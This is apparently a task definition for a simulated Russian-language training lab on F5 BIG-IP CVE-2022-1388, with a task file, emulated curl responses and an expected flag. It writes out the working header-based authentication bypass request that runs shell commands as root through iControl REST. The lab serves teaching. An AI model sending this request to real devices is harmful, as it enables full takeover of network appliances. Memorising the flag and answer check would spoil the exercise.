@@ -1,0 +1,42 @@
+{
+  "id": "web-f5-bigip",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{f5_1c0ntr0l_r3st_h34d3r_byp4ss_r00t}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: F5 BIG-IP CVE-2022-1388\n\nЦель: `https://bigip.local`. Управление — iControl REST (`/mgmt/tm/`).\n\n1. Определи продукт по заголовку:\n   curl -s -k -I https://bigip.local/tmui/login.jsp\n\n2. Убедись, что без обхода эндпоинт закрыт (ждём 401):\n   curl -s -k -o /dev/null -w '%{http_code}\\n' https://bigip.local/mgmt/tm/util/bash\n\n3. Обойди аутентификацию заголовками и выполни команду:\n   curl -s -k -X POST 'https://bigip.local/mgmt/tm/util/bash' -H 'Connection: X-F5-Auth-Token' -H 'X-F5-Auth-Token: ' -H 'Content-Type: application/json' --data-binary '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'\n\n4. В ответе — вывод команды с флагом. Сохрани в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция bigip.local)",
+      "cases": [
+        {
+          "match": "util/bash.*(run|utilCmdArgs|command)|utilCmdArgs",
+          "example": "-s -k -X POST 'https://bigip.local/mgmt/tm/util/bash' -H 'Connection: X-F5-Auth-Token' --data-binary '{...}'",
+          "output": "{\"kind\":\"tm:util:bash:runstate\",\"command\":\"run\",\"utilCmdArgs\":\"-c id\",\"commandResult\":\"uid=0(root) gid=0(root) groups=0(root)\\nnto{f5_1c0ntr0l_r3st_h34d3r_byp4ss_r00t}\\n\"}\n"
+        },
+        {
+          "match": "util/bash",
+          "example": "-s -k -o /dev/null -w '%{http_code}' https://bigip.local/mgmt/tm/util/bash",
+          "output": "401\n"
+        },
+        {
+          "match": "tmui/login\\.jsp",
+          "example": "-s -k -I https://bigip.local/tmui/login.jsp",
+          "output": "HTTP/2 200\nserver: BIG-IP\nset-cookie: BIGIPAuthCookie=; path=/; secure\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только bigip.local"
+    }
+  }
+}
